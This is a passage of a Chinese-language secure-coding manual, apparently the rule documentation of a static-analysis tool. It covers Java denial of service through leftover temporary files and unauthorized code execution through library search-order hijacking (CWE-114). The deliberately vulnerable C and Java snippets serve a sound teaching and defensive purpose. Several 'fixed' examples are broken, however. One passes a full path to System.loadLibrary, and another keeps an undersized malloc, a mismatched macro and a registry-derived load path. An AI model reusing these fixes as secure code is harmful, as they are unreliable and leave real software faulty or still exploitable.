- 攻击者通过耗尽目标机器的带宽、内存、磁盘空间或处理器运行时间等计算资源从而引起DoS。
- 攻击者利用算法相关的问题（如hash函数），通过注入最坏情况的数据从而引起DoS。
- 攻击者通过耗尽目标机器的所有网络带宽从而引起DoS。</p>
<h1 id="_2">漏洞与风险</h1>
<h4 id="dos">通过耗尽资源而引起的DoS</h4>
<p>当资源利用远远大于输入数据能造成的资源利用规模时，将有可能出现DoS问题。对那些把资源相关问题交给用户的客户端软件而言，检查输入是否会过度占用资源这种方法好像有点不妥。但不管怎样，这类软件也应该考虑那些会造成持续性的DoS问题（例如将文件系统占满）的输入。</p>
<h4 id="dos_1">并发相关的DoS问题</h4>
<p>一些形式的DoS攻击会从引入一些并发问题这一点入手，如线程死锁、线程饥饿以及竞争等。</p>
<h1 id="_3">漏洞利用威胁</h1>
<p>中</p>
<h1 id="_4">缓解与预防</h1>
<ul>
<li>在应用停止前清除掉临时文件。</li>
<li>不要同步会被重用的对象。</li>
<li>禁止那些尝试停掉JVM的不受信代码。</li>
<li>禁止异常暴露敏感信息。</li>
</ul>
<h1 id="_5">演示实例</h1>
<h3 id="_6">漏洞代码示例</h3>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kd">class</span> <span class="nc">TempFile</span> <span class="o">{</span>
  <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span><span class="o">{</span>
    <span class="n">File</span> <span class="n">f</span> <span class="o">=</span> <span class="k">new</span> <span class="n">File</span><span class="o">(</span><span class="s">"tempnam.tmp"</span><span class="o">);</span>
    <span class="k">if</span> <span class="o">(</span><span class="n">f</span><span class="o">.</span><span class="na">exists</span><span class="o">())</span> <span class="o">{</span>
      <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"This file already exists"</span><span class="o">);</span>
      <span class="k">return</span><span class="o">;</span>
    <span class="o">}</span>

    <span class="n">FileOutputStream</span> <span class="n">fop</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
    <span class="k">try</span> <span class="o">{</span>
      <span class="n">fop</span> <span class="o">=</span> <span class="k">new</span> <span class="n">FileOutputStream</span><span class="o">(</span><span class="n">f</span><span class="o">);</span>
      <span class="n">String</span> <span class="n">str</span> <span class="o">=</span> <span class="s">"Data"</span><span class="o">;</span>
      <span class="n">fop</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="n">str</span><span class="o">.</span><span class="na">getBytes</span><span class="o">());</span>
    <span class="o">}</span> <span class="k">finally</span> <span class="o">{</span>
      <span class="k">if</span> <span class="o">(</span><span class="n">fop</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">try</span> <span class="o">{</span>
          <span class="n">fop</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IOException</span> <span class="n">x</span><span class="o">)</span> <span class="o">{</span>
          <span class="c1">// Handle error</span>
        <span class="o">}</span>
      <span class="o">}</span>
    <span class="o">}</span>
  <span class="o">}</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<p>这段存在风险的代码没有在程序运行完成前清除掉临时文件。</p>
<h3 id="_7">漏洞代码修复示例</h3>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kd">class</span> <span class="nc">TempFile</span> <span class="o">{</span>
  <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
    <span class="n">Path</span> <span class="n">tempFile</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
    <span class="k">try</span> <span class="o">{</span>
      <span class="n">tempFile</span> <span class="o">=</span> <span class="n">Files</span><span class="o">.</span><span class="na">createTempFile</span><span class="o">(</span><span class="s">"tempnam"</span><span class="o">,</span> <span class="s">".tmp"</span><span class="o">);</span>
      <span class="k">try</span> <span class="o">(</span><span class="n">BufferedWriter</span> <span class="n">writer</span> <span class="o">=</span>
          <span class="n">Files</span><span class="o">.</span><span class="na">newBufferedWriter</span><span class="o">(</span><span class="n">tempFile</span><span class="o">,</span> <span class="n">Charset</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"UTF8"</span><span class="o">),</span>
                                  <span class="n">StandardOpenOption</span><span class="o">.</span><span class="na">DELETE_ON_CLOSE</span><span class="o">))</span> <span class="o">{</span>
        <span class="c1">// Write to file</span>
      <span class="o">}</span>
      <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"Temporary file write done, file erased"</span><span class="o">);</span>
    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">FileAlreadyExistsException</span> <span class="n">x</span><span class="o">)</span> <span class="o">{</span>
      <span class="n">System</span><span class="o">.</span><span class="na">err</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"File exists: "</span> <span class="o">+</span> <span class="n">tempFile</span><span class="o">);</span>
    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IOException</span> <span class="n">x</span><span class="o">)</span> <span class="o">{</span>
      <span class="c1">// Some other sort of failure, such as permissions.</span>
      <span class="n">System</span><span class="o">.</span><span class="na">err</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"Error creating temporary file: "</span> <span class="o">+</span> <span class="n">x</span><span class="o">);</span>
    <span class="o">}</span>
  <span class="o">}</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<h1 id="_8">参考资料</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-cert1">
<p>https://wiki.sei.cmu.edu/confluence/display/java/Denial+of+Service <a class="footnote-backref" href="#fnref-cert1" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
<li id="fn-cert2">
<p>https://wiki.sei.cmu.edu/confluence/display/java/FIO03-J.+Remove+temporary+files+before+termination <a class="footnote-backref" href="#fnref-cert2" title="Jump back to footnote 2 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../../tag/java.html">JAVA</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../../standard/c.html">c/c++</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues.html">安全问题</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues/input validation and representation.html">输入验证与表示</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE0089">执行未经授权的代码或命令</h1>
                <p>
                    在 2024-九月-28 发布于 <a href="../../../category/input-validation-and-representation.html">输入验证与表示</a> 分类

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#_1">缺陷描述</a></li>
<li><a href="#_2">漏洞与风险</a></li>
<li><a href="#_3">缓解与预防</a></li>
<li><a href="#_4">漏洞利用威胁</a></li>
<li><a href="#_5">演示示例</a><ul>
<li><a href="#1">漏洞代码示例 1</a><ul>
<li><a href="#1_1">修复代码示例 1</a></li>
</ul>
</li>
<li><a href="#2">漏洞代码示例 2</a><ul>
<li><a href="#2_1">修复代码示例 2</a></li>
</ul>
</li>
<li><a href="#3">漏洞代码示例 3</a></li>
<li><a href="#3_1">修复代码示例3</a></li>
</ul>
</li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="_1">缺陷描述</h1>
<p>执行未经授权的代码或命令有两种形式：</p>
<ol>
<li>攻击者可以更改程序执行的命令：攻击者明确控制该命令是什么。</li>
<li>攻击者可以改变命令执行的环境：攻击者隐式地控制命令的含义。</li>
</ol>
<p>第一种类型在数据从不可信源进入应用程序，并且数据用作表示由应用程序执行的命令的字符串的一部分时发生。 通过执行该命令，应用程序会给攻击者一个攻击者不会拥有的特权或能力。</p>
<h1 id="_2">漏洞与风险</h1>
<p>执行未经授权的代码或命令</p>
<h1 id="_3">缓解与预防</h1>
<p>加载的动态库应该来自可信来源。应用程序可以执行本地库中包含的代码，这些代码通常包含易受其他安全问题影响的调用，例如缓冲区溢出或命令注入。 应验证所有本机库以确定应用程序是否需要使用该库。确定这些本地库实际执行的内容非常困难，并且存在恶意代码的概率很高。 另外，这些本地库中的存在意想不到的错误的可能性也很高，因为许多错误都是用C或C++编写的，并且可能容易受到缓冲区溢出或竞争条件问题的影响。 为了帮助防止缓冲区溢出攻击，请将所有输入验证为本地调用的内容和长度。如果本机库不是来自可信来源，请查看库的源代码。 在使用它之前，应该使用经过审查的来源构建库。</p>
<h1 id="_4">漏洞利用威胁</h1>
<p>严重</p>
<h1 id="_5">演示示例</h1>
<h3 id="1">漏洞代码示例 1</h3>
<p>以下代码使用System.loadLibrary()从本地库library.dll中加载代码，该库通常位于标准系统目录中。</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="o">...</span>
<span class="n">System</span><span class="o">.</span><span class="na">loadLibrary</span><span class="o">(</span><span class="s">"library.dll"</span><span class="o">);</span>
<span class="o">...</span>
</pre></div>
</td></tr></table>
<p>这里的问题是System.loadLibrary()接受一个库名称，而不是一个路径，用于加载库。从Java 1.4.2 API文档中，该函数的行为如下：包含本机代码的文件是从本地文件系统从传统获取库文件的位置加载的。这个过程的细节是依赖于实现的。 从库名到特定文件名的映射是以系统特定的方式完成的。 如果攻击者能够在搜索顺序中将library.dll的恶意副本放在应用程序想要加载的文件中，则应用程序将加载恶意副本而不是预期文件。 由于应用程序的性质，它使用提升的权限运行，这意味着攻击者的library.dll的内容现在将以提升的权限运行，可能会让他们完全控制系统。</p>
<h4 id="1_1">修复代码示例 1</h4>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="o">...</span>
<span class="c1">// 用全路径</span>
<span class="n">System</span><span class="o">.</span><span class="na">loadLibrary</span><span class="o">(</span><span class="s">"C:\\path_to_real_lib\\library.dll"</span><span class="o">);</span>
<span class="o">...</span>
</pre></div>
</td></tr></table>
<h3 id="2">漏洞代码示例 2</h3>
<p>以下特权应用程序中的代码使用注册表项来确定安装它的目录，并根据指定目录中的相对路径加载库文件。</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5
6
7
8
9</pre></div></td><td class="code"><div class="highlight"><pre><span></span>...
RegQueryValueEx(hkey, "APPHOME", 0, 0, (BYTE*)home, &amp;size);
char* lib=(char*)malloc(strlen(home)+strlen(INITLIB));
if (lib) {
  strcpy(lib,home);
  strcat(lib,INITCMD);
  LoadLibrary(lib);
}
...
</pre></div>
</td></tr></table>
<p>本示例中的代码允许攻击者通过修改注册表项来指定包含恶意版本的INITLIB的不同路径，从而加载任意库，从该库中将应用程序的提升特权执行代码。 由于程序不验证从环境读取的值，如果攻击者可以控制APPHOME的值，他们可以欺骗应用程序运行恶意代码。</p>
<h4 id="2_1">修复代码示例 2</h4>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="o">...</span>

<span class="c1">// 修改注册表前确保修改数据的安全</span>
<span class="k">if</span> <span class="o">(!</span><span class="n">is_safe_key</span><span class="o">(</span><span class="n">hkey</span><span class="o">)</span> <span class="o">||</span> <span class="o">!</span><span class="n">is_safe</span><span class="o">(</span><span class="n">home</span><span class="o">))</span> <span class="o">{</span>
 <span class="n">error_handle</span><span class="o">(</span><span class="s">"Unsafe Reg editing"</span><span class="o">);</span>
    <span class="k">return</span><span class="o">;</span>
<span class="o">}</span>

<span class="n">RegQueryValueEx</span><span class="o">(</span><span class="n">hkey</span><span class="o">,</span> <span class="s">"APPHOME"</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="o">(</span><span class="n">BYTE</span><span class="o">*)</span><span class="n">home</span><span class="o">,</span> <span class="o">&amp;</span><span class="n">size</span><span class="o">);</span>
<span class="kt">char</span><span class="o">*</span> <span class="n">lib</span><span class="o">=(</span><span class="kt">char</span><span class="o">*)</span><span class="n">malloc</span><span class="o">(</span><span class="n">strlen</span><span class="o">(</span><span class="n">home</span><span class="o">)+</span><span class="n">strlen</span><span class="o">(</span><span class="n">INITLIB</span><span class="o">));</span>
<span class="k">if</span> <span class="o">(</span><span class="n">lib</span><span class="o">)</span> <span class="o">{</span>
  <span class="n">strcpy</span><span class="o">(</span><span class="n">lib</span><span class="o">,</span><span class="n">home</span><span class="o">);</span>
  <span class="n">strcat</span><span class="o">(</span><span class="n">lib</span><span class="o">,</span><span class="n">INITCMD</span><span class="o">);</span>
  <span class="n">LoadLibrary</span><span class="o">(</span><span class="n">lib</span><span class="o">);</span>
<span class="o">}</span>
<span class="o">...</span>
</pre></div>
</td></tr></table>
<h3 id="3">漏洞代码示例 3</h3>
<p>以下代码来自基于Web的管理实用程序，该实用程序允许用户访问可通过其更新系统配置文件的界面。 该实用程序使用名为liberty.dll的库，该库通常位于标准系统目录中。</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span>LoadLibrary("liberty.dll");
</pre></div>
</td></tr></table>
<p>问题是程序没有指定liberty.dll的绝对路径。如果攻击者能够将一个名为liberty.dll的恶意库放在搜索顺序中而不是应用程序打算加载的文件中，那么应用程序将加载恶意副本而不是预期文件。由于应用程序的性质，它使用提升的特权运行，这意味着攻击者的liberty.dll的内容现在将以提升的特权运行，可能会使攻击者完全控制系统。在没有指定绝对路径时，由于LoadLibrary()使用的搜索顺序，在此示例中看到的攻击类型成为可能。如果在系统目录之前搜索当前目录，就像直到最新版本的Windows一样，那么如果攻击者可以在本地执行程序，这种类型的攻击就变得微不足道了。搜索顺序依赖于操作系统版本，并且通过注册表项的值在较新的操作系统上进行控制：HKLM\System\CurrentControlSet\Control\Session Manager\SafeDllSearchMode</p>
<h3 id="3_1">修复代码示例3</h3>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="c1">// 使用全路径</span>
<span class="n">LoadLibrary</span><span class="o">(</span><span class="s">"C:\\path_to_real_lib\\liberty.dll"</span><span class="o">);</span>
</pre></div>
</td></tr></table>
<h1 id="references">References</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-cwe">
<p>http://cwe.mitre.org/data/definitions/114.html <a class="footnote-backref" href="#fnref-cwe" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../../tag/c.html">C</a>
                <a href="../../../tag/c.html">C++</a>
                <a href="../../../tag/java.html">JAVA</a>
                <a href="../../../tag/cwe-114.html">CWE-114</a>
                </p>
            </div>
        </article>

    <footer>
 <p>
  &copy; Pinpoint 2016-Present, Pinpoint 源代码静态缺陷分析系统, 源伞科技有限公司 - 保留所有权利
</p>

<p>
</p>     </footer>
</main>

  <script type="application/ld+json">
{
  "@context" : "http://schema.org",
  "@type" : "Blog",
  "name": " Pinpoint Document ",
  "url" : "../../..",
  "image": "",
  "description": "Manual and documents for Sourcebrella Pinpoint"
}
</script> 
<div id="initDiv"
     style="position: fixed; z-index: 1000; background-color: white; top: 0; right: 0; bottom: 0; left: 0; "></div>
<script type="text/javascript">
    window.onload = function () {
        document.getElementsByTagName('body')[0].style.display = "block";
        document.getElementById('initDiv').style.display = 'none';

        document.querySelectorAll('.global_lang li a').forEach(elm => {
            elm.addEventListener('click', (e) => {
                var lang = e.target.getAttribute('language-link');
                var abs_url = '/' + lang + '/';
                var reg = /\/(en|zh)\//;
                var newRef;
                var location = window.location;
                if (reg.test(location.href)) {
                    newRef = location.href.replace(reg, abs_url);
                } else {
                    var match = /\/(output|docs)\//.exec(window.location.href);
                    if (match) {
                        newRef = window.location.href.replace(match[0], '/' + match[1] + abs_url)
                    } else {
                        return;
                    }
                }
                window.open(newRef, '_self')
            })
        })
    };

</script>
</body>

</html>